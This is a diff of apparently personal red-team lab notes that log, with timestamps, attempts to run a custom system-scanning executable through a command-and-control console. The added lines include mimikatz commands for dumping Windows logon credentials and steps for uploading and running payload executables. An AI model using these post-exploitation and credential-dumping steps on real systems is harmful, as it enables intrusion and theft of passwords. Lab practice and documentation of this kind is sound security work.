@@ -54,10 +54,12 @@
 
         # copy the value inside setup.txt and replace the encoded variable (wopvEaTEcopFEavc) value inside setup.py
 
-        # create information gathering payload
+        # create information gathering payload 
         pip3 install pyinstaller
         pyinstaller --onefile SenScanner.py
         pyinstaller --onefile SysScanner.py
+
+        # executable files will be saved to current dist folder
         ``` 
         
 - Exploitation
@@ -168,6 +170,34 @@
 
         - upload script for system information gathering 
 
+            try to upload assembly file (SysScanner.exe) and load it with execute_assembly (10:36) -- failed
 
+            ```
+            # register SysScanner.exe first
+            register_assembly
+            # choose SysScanner file
+            # try to run it (10:42) (directly inside command interface)
+            execute_assembly SysScanner.exe --full
+            # try to run it (10:43)
+            execute_assembly SysScanner --full # failed
+            
+            # ------ run with mimikatz (11:04) -------
+            privilege::debug # successful
+            lsadump::sam # failed
+            sekurlsa::logonpasswords  # successful
 
+            # register file SysScanner.exe (11:11)
+            register_file # need to wait until it is successfully registered (successfully att 11:15)
+            # using run command to run
+            run # add name with SysScanner - failed (11:14)
+            # run again --- failed
 
+            # ------ Use upload and run as a pair ------
+            # upload file
+            upload # upload SysScanner.exe to C:\Users\test.exe (11:22)
+            # run this file
+            run # provide Executable C:\Users\test.exe (11:30)
+
+            ```
+
+            - received compressed file by SysScanner --- failed due to win32 compatibility problem
